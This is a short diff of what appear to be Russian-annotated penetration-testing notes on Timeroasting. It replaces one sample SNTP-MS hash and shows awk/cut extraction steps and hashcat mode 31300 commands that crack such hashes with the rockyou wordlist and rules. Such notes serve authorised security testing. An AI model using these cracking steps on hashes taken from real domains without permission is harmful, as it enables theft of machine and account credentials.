@@ -59,7 +59,7 @@ cat hashes.txt | awk '{print $5}' >  timeroast_hashes.txt
 cut -d':' -f2- timeroast_hashes.txt > clean_hashes.txt
 
 пример хэша 
-$sntp-ms$8952c9dd3ad8418cfb1d827b15c60d18$1c0211e900000014000a1ae20a010001ee26b2276bd05949e1b8428bffbfcd0aee26b263d3bf9907ee26b263d3c01a36
+$sntp-ms$b99b0a203fb03e6502e0fdd218253429$1c0211e900000010000a1a760a010001ee26b1d8142a058de1b8428bffbfcd0aee26b1f09c1986b9ee26b1f09c19b0ab
 
 hashcat -m 31300 -a 0 timeroast_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule 
 hashcat -m 31300 -a 0 timeroast_hashes.txt --show 
